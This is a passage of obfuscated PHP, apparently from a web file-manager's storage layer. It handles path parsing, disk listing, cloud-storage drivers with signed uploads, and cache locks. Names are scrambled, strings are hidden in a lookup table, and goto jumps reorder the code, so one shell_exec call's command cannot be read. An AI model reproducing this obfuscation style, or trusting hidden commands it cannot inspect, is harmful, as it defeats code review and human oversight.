$Ô¶í‚ä, $óŒ¨áÖÂ[1210] => !1, $óŒ¨áÖÂ[1209] => $óŒ¨áÖÂ[12]); if (is_array($œ•×ŠÈù) && count($œ•×ŠÈù) == 5) { $«ü÷³Ğ¼ = $óŒ¨áÖÂ[1310] . $œ•×ŠÈù[2] . $óŒ¨áÖÂ[382]; if (in_array($«ü÷³Ğ¼, $­ÛØÂªş)) { $ÚõõÂ–[$óŒ¨áÖÂ[1210]] = $œ•×ŠÈù[1]; $ÚõõÂ–[$óŒ¨áÖÂ[33]] = $«ü÷³Ğ¼; $ÚõõÂ–[$óŒ¨áÖÂ[1311]] = substr($«ü÷³Ğ¼, 1, -1); $ÚõõÂ–[$óŒ¨áÖÂ[453]] = $œ•×ŠÈù[3]; } $ÚõõÂ–[$óŒ¨áÖÂ[1209]] = $œ•×ŠÈù[4]; } $©¹¨‡¶Ÿ = array($óŒ¨áÖÂ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÚõõÂ–[$óŒ¨áÖÂ[1274]] = in_array($ÚõõÂ–[$óŒ¨áÖÂ[33]], $©¹¨‡¶Ÿ); return $ÚõõÂ–; } public static function isTruePath($¨º›«Ø) { $½¶„ÇÜ =& $_SERVER[ •ŒÓîÆ]; if (substr($¨º›«Ø, 0, 1) != $½¶„ÇÜ[1310]) { return !0; } if (strpos($¨º›«Ø, $½¶„ÇÜ[462]) === 0) { return !0; } if (strpos($¨º›«Ø, $½¶„ÇÜ[1278]) === 0) { return !0; } if (strpos($¨º›«Ø, $½¶„ÇÜ[1312]) === 0) { return !0; } if (strpos($¨º›«Ø, $½¶„ÇÜ[1313]) === 0) { return !0; } if (strpos($¨º›«Ø, $½¶„ÇÜ[1314]) === 0) { return !0; } return !1; } public static function clear($æÂ±¾É†) { $õ¶Šøï =& $_SERVER[ •ŒÓîÆ]; $æÂ±¾É† = str_replace(array($õ¶Šøï[1119], $õ¶Šøï[248]), $õ¶Šøï[53], $æÂ±¾É†); $æÂ±¾É† = str_replace($õ¶Šøï[99], $õ¶Šøï[8], $æÂ±¾É†); $ÙİÜ«Üã = $õ¶Šøï[1315]; if (substr($æÂ±¾É†, 0, 3) == $õ¶Šøï[1316]) { $æÂ±¾É† = substr($æÂ±¾É†, 3); } while (strstr($æÂ±¾É†, $ÙİÜ«Üã)) { $æÂ±¾É† = str_replace($ÙİÜ«Üã, $õ¶Šøï[8], $æÂ±¾É†); } $æÂ±¾É† = preg_replace($õ¶Šøï[1317], $õ¶Šøï[8], $æÂ±¾É†); if ($æÂ±¾É† == $õ¶Šøï[8]) { return $õ¶Šøï[8]; } $æÂ±¾É† = rtrim($æÂ±¾É†, $õ¶Šøï[8]); return $æÂ±¾É†; } public static function pathTrue($øŠ–ò™É) { $©šÃ™ =& $_SERVER[ •ŒÓîÆ]; if (!$øŠ–ò™É) { return $©šÃ™[12]; } $øŠ–ò™É = str_replace($©šÃ™[573], $©šÃ™[8], str_replace($©šÃ™[1318], $©šÃ™[8], $øŠ–ò™É)); $øŠ–ò™É = str_replace($©šÃ™[573], $©šÃ™[8], str_replace($©šÃ™[1318], $©šÃ™[8], $øŠ–ò™É)); if (!strstr($øŠ–ò™É, $©šÃ™[1316])) { return $øŠ–ò™É; } $¦¬æÑçò = explode($©šÃ™[8], $øŠ–ò™É); foreach ($¦¬æÑçò as $Æüã«ÇÍ => $ËĞÙ¥·) { if ($ËĞÙ¥· !== $©šÃ™[1319]) { continue; } for ($ËÁ¾øÃ¶ = $Æüã«ÇÍ; $ËÁ¾øÃ¶ >= 0; $ËÁ¾øÃ¶--) { if ($¦¬æÑçò[$ËÁ¾øÃ¶] === $©šÃ™[10] || $¦¬æÑçò[$ËÁ¾øÃ¶] === $©šÃ™[1319] || $¦¬æÑçò[$ËÁ¾øÃ¶] === -1) { continue; } if ($¦¬æÑçò[$ËÁ¾øÃ¶] === $©šÃ™[12]) { $¦¬æÑçò[$Æüã«ÇÍ] = -1; break; } $¦¬æÑçò[$Æüã«ÇÍ] = -1; $¦¬æÑçò[$ËÁ¾øÃ¶] = -1; break; } } $÷Ö¬¨ËÊ = array(); foreach ($¦¬æÑçò as $ËĞÙ¥·) { if ($ËĞÙ¥· !== -1) { $÷Ö¬¨ËÊ[] = $ËĞÙ¥·; } } $”¬ÒŒÆØ = implode($©šÃ™[8], $÷Ö¬¨ËÊ); if (strpos($”¬ÒŒÆØ, $©šÃ™[1320]) === 0) { $”¬ÒŒÆØ = $©šÃ™[1316] . substr($”¬ÒŒÆØ, strlen($©šÃ™[1320])); } return $”¬ÒŒÆØ; } public static function sourceID($¶àŞØÍû) { $ÚˆşúÄï =& $_SERVER[ •ŒÓîÆ]; $²˜ÒËˆÎ = self::parse($¶àŞØÍû); if ($²˜ÒËˆÎ[$ÚˆşúÄï[33]] !== self::KOD_SOURCE) { show_json(LNG($ÚˆşúÄï[1321]), !1); } return $²˜ÒËˆÎ[$ÚˆşúÄï[453]]; } public static function make($ÜÛ’ÔÑ) { if (!$ÜÛ’ÔÑ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÜÛ’ÔÑ)); } public static function makeShare($æ’•äıš, $«Ô¹¶·Ø) { return self::makePath(self::KOD_SHARE_ITEM, $æ’•äıš, $«Ô¹¶·Ø); } public static function makeFileTypePath($ˆ‡ù²úû) { return self::makePath(self::KOD_USER_FILE_TYPE, $ˆ‡ù²úû); } public static function makeFileTagPath($…úËäúò) { return self::makePath(self::KOD_USER_FILE_TAG, $…úËäúò); } public static function makePath($à½ŞëŠ, $Ó¬È¾Òú = '', $Œá¨âéì = '') { $èœŞ¾Ä =& $_SERVER[ •ŒÓîÆ]; $Ô¤œõˆ¢ = substr($à½ŞëŠ, 1, -1); $”Ïªä£ = $èœŞ¾Ä[1322] . $Ô¤œõˆ¢ . $èœŞ¾Ä[1323] . $Ó¬È¾Òú . $èœŞ¾Ä[1324]; $”Ïªä£ = $Œá¨âéì ? $”Ïªä£ . $Œá¨âéì . $èœŞ¾Ä[8] : $”Ïªä£; return $”Ïªä£; } public static function hashPath($ÓüÈÃ°†, $Ñ‘©ıïá = true) { $õÛ©ßÜÒ =& $_SERVER[ •ŒÓîÆ]; $À´÷ıÉ¡ = is_array($ÓüÈÃ°†) ? $ÓüÈÃ°† : IO::info($ÓüÈÃ°†); $Ÿàéší¯ = _get($À´÷ıÉ¡, $õÛ©ßÜÒ[1325], $õÛ©ßÜÒ[12]); if (!$Ÿàéší¯ && isset($À´÷ıÉ¡[$õÛ©ßÜÒ[221]])) { $Ÿàéší¯ = trim($À´÷ıÉ¡[$õÛ©ßÜÒ[221]], $õÛ©ßÜÒ[120]); } if (!$Ÿàéší¯ && isset($À´÷ıÉ¡[$õÛ©ßÜÒ[183]]) && $À´÷ıÉ¡[$õÛ©ßÜÒ[183]]) { $À´÷ıÉ¡ = IO::info(KodIO::make($À´÷ıÉ¡[$õÛ©ßÜÒ[183]])); $Ÿàéší¯ = _get($À´÷ıÉ¡, $õÛ©ßÜÒ[1325], $õÛ©ßÜÒ[12]); } $Ä“¨ÑÚ = md5($À´÷ıÉ¡[$õÛ©ßÜÒ[86]] . $À´÷ıÉ¡[$õÛ©ßÜÒ[78]] . $À´÷ıÉ¡[$õÛ©ßÜÒ[87]]); if (!$Ÿàéší¯ && file_exists($À´÷ıÉ¡[$õÛ©ßÜÒ[86]])) { $Ÿàéší¯ = Cache::get($Ä“¨ÑÚ . $õÛ©ßÜÒ[1326]); $Ÿàéší¯ = !1; if (!$Ÿàéší¯) { $Ÿàéší¯ = IO::hashSimple($À´÷ıÉ¡[$õÛ©ßÜÒ[86]]); Cache::set($Ä“¨ÑÚ . $õÛ©ßÜÒ[1326], $Ÿàéší¯, 3600 * 24 * 30); } } if ($Ñ‘©ıïá && !$Ÿàéší¯) { } return $Ÿàéší¯ ? $Ÿàéší¯ : $Ä“¨ÑÚ; } public static function hashPathSafe($òòÄ²ô†, $Œ´„¾“ğ = true) { $¹¥¶ºşö =& $_SERVER[ •ŒÓîÆ]; $¯÷š²… = self::hashPath($òòÄ²ô†, $Œ´„¾“ğ); return md5($¯÷š²… . $¹¥¶ºşö[1327] . Model($¹¥¶ºşö[811])->get($¹¥¶ºşö[812])); } public static function initSystemPath() { $ûµÓ‰ñ¬ =& $_SERVER[ •ŒÓîÆ]; if (defined($ûµÓ‰ñ¬[1328])) { return; } define($ûµÓ‰ñ¬[1328], self::systemPath($ûµÓ‰ñ¬[181])); define($ûµÓ‰ñ¬[1329], self::systemPath($ûµÓ‰ñ¬[1330])); define($ûµÓ‰ñ¬[1331], self::systemPath($ûµÓ‰ñ¬[1332])); define($ûµÓ‰ñ¬[1333], self::systemPath($ûµÓ‰ñ¬[1334])); IOHistory::bindEvent(); } public static function systemPath($›¦®Ø»û) { $°¥±©½µ =& $_SERVER[ •ŒÓîÆ]; $Ì®²„¹€ = $°¥±©½µ[1335] . ucfirst($›¦®Ø»û); $Ä²Öëø‡ = Model($°¥±©½µ[811])->get($Ì®²„¹€); if ($Ä²Öëø‡) { return $Ä²Öëø‡; } if ($›¦®Ø»û == $°¥±©½µ[181]) { $Ä²Öëø‡ = self::make(Model($°¥±©½µ[866])->systemRootPathAdd($°¥±©½µ[586])); } else { $Ä²Öëø‡ = self::systemPath($°¥±©½µ[181]); $åƒÚàƒà = self::sourceID($Ä²Öëø‡); $Ä²Öëø‡ = self::make(Model($°¥±©½µ[866])->mkdir($åƒÚàƒà, $›¦®Ø»û)); } Model($°¥±©½µ[811])->set($Ì®²„¹€, $Ä²Öëø‡); return $Ä²Öëø‡; } public static function systemFolder($Ãõ˜úíØ) { $¤‹’¢Œ· = IO_PATH_SYSTEM_SOURCE . $Ãõ˜úíØ; $Ææ³ÂÒ = Cache::get($¤‹’¢Œ·); if (!$Ææ³ÂÒ) { $ç†ßĞØ¦ = IO::infoFullSimple($¤‹’¢Œ·); if (!$ç†ßĞØ¦) { $Ææ³ÂÒ = IO::mkdir($¤‹’¢Œ·, REPEAT_SKIP); } else { $Ææ³ÂÒ = $ç†ßĞØ¦[$_SERVER[ •ŒÓîÆ][86]]; } Cache::set($¤‹’¢Œ·, $Ææ³ÂÒ, 3600 * 10); } return $Ææ³ÂÒ; } public static function defaultDriver() { return Model($_SERVER[ •ŒÓîÆ][808])->defaultDriver(); } public static function defaultIO() { $ÇÍí‚¶ =& $_SERVER[ •ŒÓîÆ]; $Ğ…€ş– = self::defaultDriver(); return $ÇÍí‚¶[1336] . $Ğ…€ş–[$ÇÍí‚¶[453]] . $ÇÍí‚¶[1324]; } public static function defaultDriverInit() { static $ÆÂø¡¸Ú = false; if ($ÆÂø¡¸Ú) { return $ÆÂø¡¸Ú; } $ÆÂø¡¸Ú = IO::init(self::defaultIO()); return $ÆÂø¡¸Ú; } public static function fileTypeList() { $ïÕŠ¾àÛ =& $_SERVER[ •ŒÓîÆ]; $üÛ¡ß± = $GLOBALS[$ïÕŠ¾àÛ[6]][$ïÕŠ¾àÛ[1337]]; foreach ($üÛ¡ß± as $ß©ûïŠ™ => $›ÀÌœì™) { $şá­Ò› = $ïÕŠ¾àÛ[1338] . $ß©ûïŠ™; $Ô˜æñ˜¼ = LNG($şá­Ò›); if ($şá­Ò› != $Ô˜æñ˜¼) { $üÛ¡ß±[$ß©ûïŠ™][$ïÕŠ¾àÛ[32]] = $Ô˜æñ˜¼; } } return $üÛ¡ß±; } public static function diskList($±ê†¾ç– = true) { $á¦ï¿—¿ = $_SERVER[ •ŒÓîÆ][1339]; if ($±ê†¾ç–) { $ÔëÂĞåÍ = Cache::get($á¦ï¿—¿); if (is_array($ÔëÂĞåÍ)) { return $ÔëÂĞåÍ; } } $ÔëÂĞåÍ = self::diskListGet(); Cache::set($á¦ï¿—¿, $ÔëÂĞåÍ, 60); return $ÔëÂĞåÍ; } public static function diskListGet() { $±ëëğ =& $_SERVER[ •ŒÓîÆ]; $ÇãŸ‚¶ = array(); if ($GLOBALS[$±ëëğ[6]][$±ëëğ[1340]] == $±ëëğ[1341]) { $Ì›§œÃƒ = $±ëëğ[1342]; for ($†ûÁùü¿ = 0; $†ûÁùü¿ < strlen($Ì›§œÃƒ); $†ûÁùü¿++) { $»——ê÷ = $Ì›§œÃƒ[$†ûÁùü¿] . $±ëëğ[1343]; if (file_exists($»——ê÷)) { $ÇãŸ‚¶[] = $»——ê÷; } } return $ÇãŸ‚¶; } if (!function_exists($±ëëğ[100])) { $ÇãŸ‚¶[] = $±ëëğ[877]; return $ÇãŸ‚¶; } $Àù…É±ò = explode($±ëëğ[248], shell_exec($±ëëğ[1344])); array_shift($Àù…É±ò); array_pop($Àù…É±ò); $“–³«´ = array($±ëëğ[1345], $±ëëğ[1346], $±ëëğ[1347], $±ëëğ[1348], $±ëëğ[1349], $±ëëğ[1350], $±ëëğ[1351], $±ëëğ[1352]); foreach ($Àù…É±ò as $Â¨‚Á¨­) { $äˆ¶È‚  = preg_split($±ëëğ[1353], $Â¨‚Á¨­); $»——ê÷ = $äˆ¶È‚ [count($äˆ¶È‚ ) - 1]; if (!strstr($äˆ¶È‚ [0], $±ëëğ[1354]) || !$»——ê÷) { continue; } $» ˆêÔÅ = rtrim($»——ê÷, $±ëëğ[8]) . $±ëëğ[8]; if (in_array($» ˆêÔÅ, $“–³«´)) { continue; } $ÇãŸ‚¶[] = $» ˆêÔÅ; } return $ÇãŸ‚¶; } public static function isSameDisk($Ğøğª÷ò, $Èê«­Õ) { $é’§€ÙÔ =& $_SERVER[ •ŒÓîÆ]; if ($GLOBALS[$é’§€ÙÔ[6]][$é’§€ÙÔ[1340]] == $é’§€ÙÔ[1341]) { return strtolower(substr($Ğøğª÷ò, 0, 1)) == strtolower(substr($Èê«­Õ, 0, 1)); } $Ï¾”Ù§° = self::diskList(); $°½ú¨¯¬ = !1; $¾¼Íªô§ = !1; sort($Ï¾”Ù§°); $Ï¾”Ù§° = array_reverse($Ï¾”Ù§°); $Ğøğª÷ò = rtrim($Ğøğª÷ò, $é’§€ÙÔ[8]) . $é’§€ÙÔ[8]; $Èê«­Õ = rtrim($Èê«­Õ, $é’§€ÙÔ[8]) . $é’§€ÙÔ[8]; foreach ($Ï¾”Ù§° as $µşâ›¹ï) { $¦–üÕè = strlen($µşâ›¹ï); if (!$°½ú¨¯¬ && substr($Ğøğª÷ò, 0, $¦–üÕè) == $µşâ›¹ï) { $°½ú¨¯¬ = $µşâ›¹ï; } if (!$¾¼Íªô§ && substr($Èê«­Õ, 0, $¦–üÕè) == $µşâ›¹ï) { $¾¼Íªô§ = $µşâ›¹ï; } if ($°½ú¨¯¬ && $¾¼Íªô§) { break; } } return $°½ú¨¯¬ === $¾¼Íªô§; } public static function transferType($ÇÑ©£«­, $ä£–ş») { $‹‹ÔØá =& $_SERVER[ •ŒÓîÆ]; $ô±äôŸƒ = self::driverType($ÇÑ©£«­); $óúÚãà® = self::driverType($ä£–ş»); if ($ô±äôŸƒ[$‹‹ÔØá[33]] == $óúÚãà®[$‹‹ÔØá[33]] && $ô±äôŸƒ[$‹‹ÔØá[1355]] == $óúÚãà®[$‹‹ÔØá[1355]]) { return $‹‹ÔØá[1356]; } if ($ô±äôŸƒ[$‹‹ÔØá[33]] == $‹‹ÔØá[910] && $óúÚãà®[$‹‹ÔØá[33]] == $‹‹ÔØá[108]) { return $‹‹ÔØá[1235]; } if ($ô±äôŸƒ[$‹‹ÔØá[33]] == $‹‹ÔØá[108] && $óúÚãà®[$‹‹ÔØá[33]] == $‹‹ÔØá[910]) { return $‹‹ÔØá[109]; } return $‹‹ÔØá[1357]; } public static function driverType($ğşìÙ–²) { $‰óÜšãç =& $_SERVER[ •ŒÓîÆ]; $——×§ô¯ = str_replace($‰óÜšãç[1358], $‰óÜšãç[12], strtolower($ğşìÙ–²->getType())); if ($——×§ô¯ == $‰óÜšãç[798] || $——×§ô¯ == $‰óÜšãç[1359] || $——×§ô¯ == $‰óÜšãç[1360]) { $ğşìÙ–² = self::defaultDriverInit(); } else { if ($——×§ô¯ == $‰óÜšãç[1245] || $——×§ô¯ == $‰óÜšãç[1361]) { $ğşìÙ–² = IO::init($ğşìÙ–²->pathParse[$‰óÜšãç[1192]]); } } $±Ñˆ ©ø = $ğşìÙ–²->path; $——×§ô¯ = str_replace($‰óÜšãç[1358], $‰óÜšãç[12], strtolower($ğşìÙ–²->getType())); if ($——×§ô¯ == $‰óÜšãç[108]) { return array($‰óÜšãç[33] => $‰óÜšãç[108], $‰óÜšãç[1355] => $‰óÜšãç[12], $‰óÜšãç[86] => $±Ñˆ ©ø, $‰óÜšãç[97] => $ğşìÙ–²); } return array($‰óÜšãç[33] => $‰óÜšãç[910], $‰óÜšãç[1355] => $ğşìÙ–²->pathDriver, $‰óÜšãç[86] => $±Ñˆ ©ø, $‰óÜšãç[97] => $ğşìÙ–²); } public static function pathDriverType($˜ö±âÓ) { return $˜ö±âÓ ? self::driverType(IO::init($˜ö±âÓ)) : !1; } public static function pathDriverLocal($ÉÖ‰şş ) { $€â¤ë  =& $_SERVER[ •ŒÓîÆ]; $Êß²§‡† = $ÉÖ‰şş  ? self::driverType(IO::init($ÉÖ‰şş )) : !1; return $Êß²§‡†[$€â¤ë [33]] == $€â¤ë [108] ? !0 : !1; } public static function allowCover($â‡¾Ö¨, $«‘€‡œ¼ = true) { $¨—ÜÀë =& $_SERVER[ •ŒÓîÆ]; if (is_string($â‡¾Ö¨)) { $â‡¾Ö¨ = IO::info($â‡¾Ö¨); } if (!$â‡¾Ö¨ || $â‡¾Ö¨[$¨—ÜÀë[33]] == $¨—ÜÀë[77] || $â‡¾Ö¨[$¨—ÜÀë[78]] <= 100) { return !1; } if (isset($â‡¾Ö¨[$¨—ÜÀë[1362]]) || !$â‡¾Ö¨[$¨—ÜÀë[86]]) { return !1; } if (isset($â‡¾Ö¨[$¨—ÜÀë[218]]) && !$â‡¾Ö¨[$¨—ÜÀë[218]]) { return !1; } static $¿Ã×­î = false; if (!$¿Ã×­î || !$«‘€‡œ¼) { $üŒ¼Ò¬´ = self::driverType(IO::init($â‡¾Ö¨[$¨—ÜÀë[86]])); $¥î©êçˆ = $üŒ¼Ò¬´[$¨—ÜÀë[97]]; $¿Ã×­î = $¨—ÜÀë[186]; if ($üŒ¼Ò¬´[$¨—ÜÀë[33]] == $¨—ÜÀë[108]) { $¿Ã×­î = $¨—ÜÀë[1363]; } if ($üŒ¼Ò¬´[$¨—ÜÀë[97]] && is_array($üŒ¼Ò¬´[$¨—ÜÀë[97]]->config)) { $üà½ùü = $üŒ¼Ò¬´[$¨—ÜÀë[97]]->config; if (isset($üà½ùü[$¨—ÜÀë[1364]]) && $üà½ùü[$¨—ÜÀë[1364]]) { $¿Ã×­î = $¨—ÜÀë[1363]; } } } return $¿Ã×­î == $¨—ÜÀë[1363] ? !0 : !1; } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($±°õÈê) { parent::__construct($±°õÈê); } public function getHost() { $ÔŸ½Ê£ã =& $_SERVER[ •ŒÓîÆ]; $§Í¹º = str_rtrim(parent::getHost(), $ÔŸ½Ê£ã[8] . $this->bucket); $§Í¹º = explode($ÔŸ½Ê£ã[200], $§Í¹º); return $§Í¹º[0] . $ÔŸ½Ê£ã[200] . $this->bucket . $ÔŸ½Ê£ã[1365] . $§Í¹º[1]; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($‘ôí÷Û“) { parent::__construct($‘ôí÷Û“); $this->signatureVersion($_SERVER[ •ŒÓîÆ][233]); } public function uploadFormData($®ŠÚûÉĞ, $æšµ˜’½ = 3600) { $•“©ÓÕ =& $_SERVER[ •ŒÓîÆ]; $º•¦µ¤ = $•“©ÓÕ[215]; $‹¢£âª· = $•“©ÓÕ[249]; $ò¹éÆÒø = $•“©ÓÕ[268]; $±öÀóã† = gmdate($•“©ÓÕ[1366], time() + $æšµ˜’½); $ÈŠº›ÁŒ = (string) time() . $•“©ÓÕ[73] . (string) (time() + $æšµ˜’½); $î×Ìêô = array($•“©ÓÕ[269] => $±öÀóã†, $•“©ÓÕ[272] => array(array($•“©ÓÕ[274] => $º•¦µ¤), array($•“©ÓÕ[273] => $this->bucket), array($•“©ÓÕ[275], $•“©ÓÕ[276], $•“©ÓÕ[12]), array($•“©ÓÕ[279] => $ò¹éÆÒø), array($•“©ÓÕ[1367] => $‹¢£âª·), array($•“©ÓÕ[1368] => $this->accessKey), array($•“©ÓÕ[1369] => $ÈŠº›ÁŒ))); $î×Ìêô = json_encode($î×Ìêô); $±¼‹õş = hash_hmac($•“©ÓÕ[249], $ÈŠº›ÁŒ, $this->secret); $² ÓÔ‹ = sha1($î×Ìêô); $êá•êß° = hash_hmac($•“©ÓÕ[249], $² ÓÔ‹, $±¼‹õş); $™·°³ä = array($•“©ÓÕ[274] => $º•¦µ¤, $•“©ÓÕ[279] => $ò¹éÆÒø, $•“©ÓÕ[287] => base64_encode($î×Ìêô), $•“©ÓÕ[1367] => $‹¢£âª·, $•“©ÓÕ[1368] => $this->accessKey, $•“©ÓÕ[1370] => $ÈŠº›ÁŒ, $•“©ÓÕ[1371] => $êá•êß°, $•“©ÓÕ[198] => $this->getHost()); return $™·°³ä; } public function fileOutLink($›‰¶ ÙÃ) { $çÍÚ†»Í =& $_SERVER[ •ŒÓîÆ]; if (substr($›‰¶ ÙÃ, 0, 7) == $çÍÚ†»Í[1372]) { $›‰¶ ÙÃ = $çÍÚ†»Í[1373] . substr($›‰¶ ÙÃ, 7); } header($çÍÚ†»Í[164] . $›‰¶ ÙÃ); die; } } goto bÔ Ë; f‚ßšÆ¾­°: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ôÂÉ¢ñ… =& $_SERVER[ •ŒÓîÆ]; $Åõ¥™¦è = $GLOBALS[$ôÂÉ¢ñ…[6]][$ôÂÉ¢ñ…[404]]; self::$cachePath = $Åõ¥™¦è[$ôÂÉ¢ñ…[216]][$ôÂÉ¢ñ…[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ç–ÓÜÙÅ, $ı ¡ş = 0) { $øø½Ïí¾ =& $_SERVER[ •ŒÓîÆ]; $½ÎÔ­ÍĞ = microtime(!0); $„”¯¬Æ“ = $½ÎÔ­ÍĞ + $ı ¡ş + 0.0001; $Ñõ˜¸ÉÜ = rtrim(self::$cachePath, $øø½Ïí¾[8]) . $øø½Ïí¾[905] . md5($Ç–ÓÜÙÅ) . $øø½Ïí¾[902]; if (file_exists($Ñõ˜¸ÉÜ) && filemtime($Ñõ˜¸ÉÜ) && filemtime($Ñõ˜¸ÉÜ) < time() - 10) { @unlink($Ñõ˜¸ÉÜ); } do { if (file_exists($Ñõ˜¸ÉÜ)) { cacheLockWait(); continue; } $¾™öñ„î = fopen($Ñõ˜¸ÉÜ, $øø½Ïí¾[906]); if (!$¾™öñ„î) { return !1; } $¯°ƒÆÉ­ = flock($¾™öñ„î, LOCK_EX | LOCK_NB); self::$caches[$Ç–ÓÜÙÅ] = array($øø½Ïí¾[907] => $¾™öñ„î, $øø½Ïí¾[216] => $Ñõ˜¸ÉÜ); fwrite($¾™öñ„î, $„”¯¬Æ“); clearstatcache(); if ($¾™öñ„î && $¯°ƒÆÉ­) { return !0; } cacheLockWait(); } while (microtime(!0) < $„”¯¬Æ“); $this->unlock($Ç–ÓÜÙÅ); return !1; } public function lockGet($•ÑÅŒÉ°) { $áÛÊ¨îŒ =& $_SERVER[ •ŒÓîÆ]; $Ø¸Ï­äŒ = rtrim(self::$cachePath, $áÛÊ¨îŒ[8]) . $áÛÊ¨îŒ[905] . md5($•ÑÅŒÉ°) . $áÛÊ¨îŒ[902]; return file_exists($Ø¸Ï­äŒ); } public function unlock($‘ëÆ¼²ë) { $¤òõÄÆ =& $_SERVER[ •ŒÓîÆ]; $ùê’Ş¸Á = self::$caches[$‘ëÆ¼²ë]; if (!$ùê’Ş¸Á) { return; } @flock($ùê’Ş¸Á[$¤òõÄÆ[907]], LOCK_UN); @fclose($ùê’Ş¸Á[$¤òõÄÆ[907]]); @unlink($ùê’Ş¸Á[$¤òõÄÆ[216]]); unset(self::$caches[$‘ëÆ¼²ë]); } } class CacheLockRedis { public function lock($É—Ëå¥¶, $»Ò¼ñÖ = 10) { $³ğØõ’ê = Cache::init(); $ø”¶è´Î = microtime(!0) + $»Ò¼ñÖ; while (microtime(!0) < $ø”¶è´Î) { $âèŒùò· = $³ğØõ’ê->get($É—Ëå¥¶); if (!$âèŒùò·) { $Ëßî± = $³ğØõ’ê->setLock($É—Ëå¥¶, $ø”¶è´Î, $»Ò¼ñÖ); if ($Ëßî±) { return !0; } } else { if ($âèŒùò· < microtime(!0)) { $³ğØõ’ê->set($É—Ëå¥¶, $ø”¶è´Î, $»Ò¼ñÖ * 2); if ($³ğØõ’ê->get($É—Ëå¥¶) === $âèŒùò·) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ÿ—ãëå±) { return Cache::init()->get($Ÿ—ãëå±); } public function unlock($£´ŒŸé) { return Cache::init()->remove($£´ŒŸé); } } goto e©¼ÚÉªïé; e©¼ÚÉªïé: class CacheLockMemcached { public function lock($¢òá§ñÉ, $Õ²À© = 0) { $Øõş×ÔŠ = Cache::init(); $ïñšä¹ = microtime(!0) + $Õ²À©; while (microtime(!0) < $ïñšä¹) { $ÁÈ¤Ê±˜ = $Øõş×ÔŠ->get($¢òá§ñÉ); if (!$ÁÈ¤Ê±˜ || $ÁÈ¤Ê±˜ < microtime(!0)) { $ÆéÃ³Á¥ = $Øõş×ÔŠ->handle->add($¢òá§ñÉ, $ïñšä¹, $Õ²À©); if ($ÆéÃ³Á¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ËÄ¸êèô) { return Cache::init()->get($ËÄ¸êèô); } public function unlock($€Ó½„Ó´) { return Cache::init()->remove($€Ó½„Ó´); } } class CacheLockDatabase { public function lock($Ø©šÄª‚, $Ê®«–Á¹ = 0) { $ø£ïĞ—ı = Model($_SERVER[ •ŒÓîÆ][870]); $ÊşØ‰¤® = microtime(!0) + $Ê®«–Á¹; while (microtime(!0) < $ÊşØ‰¤®) { $ª»Á® = $ø£ïĞ—ı->get($Ø©šÄª‚); if (!$ª»Á® || $ª»Á® < microtime(!0)) { $â×Ì’ı = $ø£ïĞ—ı->set($Ø©šÄª‚, $ÊşØ‰¤®); if ($â×Ì’ı) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($™‚ËöÆú) { return Model($_SERVER[ •ŒÓîÆ][870])->get($™‚ËöÆú); } public function unlock($å€Ëæº×) { Model($_SERVER[ •ŒÓîÆ][870])->remove($å€Ëæº×); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ì³Ëîú, $ĞÛšı) { $ƒàœ’¹Ÿ =& $_SERVER[ •ŒÓîÆ]; if (!class_exists($ƒàœ’¹Ÿ[908])) { show_json($ƒàœ’¹Ÿ[909], !1); } $this->cacheTime = $ĞÛšı; $this->handle = new Memcached(); if (is_array($ì³Ëîú[$ƒàœ’¹Ÿ[910]]) && count($ì³Ëîú[$ƒàœ’¹Ÿ[910]]) >= 1) { foreach ($ì³Ëîú[$ƒàœ’¹Ÿ[910]] as $ºÀ«ˆÉï) { $¡²ŸÀ–ü = explode($ƒàœ’¹Ÿ[4], $ºÀ«ˆÉï); $this->handle->addServer($¡²ŸÀ–ü[0], $¡²ŸÀ–ü[1]); } } else { $this->handle->addServer($ì³Ëîú[$ƒàœ’¹Ÿ[198]], $ì³Ëîú[$ƒàœ’¹Ÿ[199]]); } } public function set($£æÉ„¾ı, $´©Óğãª, $ôôê¡Œ = false) { $ôôê¡Œ = $ôôê¡Œ ? $ôôê¡Œ : $this->cacheTime; return $this->handle->set($£æÉ„¾ı, $´©Óğãª, $ôôê¡Œ); } public function get($×çáÔáş) { return $this->handle->get($×çáÔáş); } public function remove($¥²¡¡…) { return $this->handle->delete($¥²¡¡…); } public function deleteAll() { return $this->handle->flush(); } } goto E„ˆòÌù ; C¥Ÿâ‘Ê: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ò’ıÉØ¬) { parent::__construct(); require_once SDK_DIR . $_SERVER[ •ŒÓîÆ][1454]; $this->_init($Ò’ıÉØ¬); } public function _init($¯‰­âƒÚ) { $Õ”ÂÎ·÷ =& $_SERVER[ •ŒÓîÆ]; $this->config = $¯‰­âƒÚ; foreach ($¯‰­âƒÚ as $ğ…Öç¶” => $ŞÂâß¥) { if (isset($this->{$ğ…Öç¶”})) { $this->{$ğ…Öç¶”} = $ŞÂâß¥; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Õ”ÂÎ·÷[1455] . LNG($Õ”ÂÎ·÷[1414])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¬ÛÄŞå, $ÔÙ“ÎŠ¾ = '', $ºãÑµ´Œ = REPEAT_RENAME) { if ($this->setContent($¬ÛÄŞå, $ÔÙ“ÎŠ¾)) { return $this->getPathOuter($¬ÛÄŞå); } return !1; } public function mkdir($±Ÿ»İç£, $¶¹úŞº˜ = REPEAT_SKIP) { $Åçªâ‹ =& $_SERVER[ •ŒÓîÆ]; $¬â ˆğÛ = 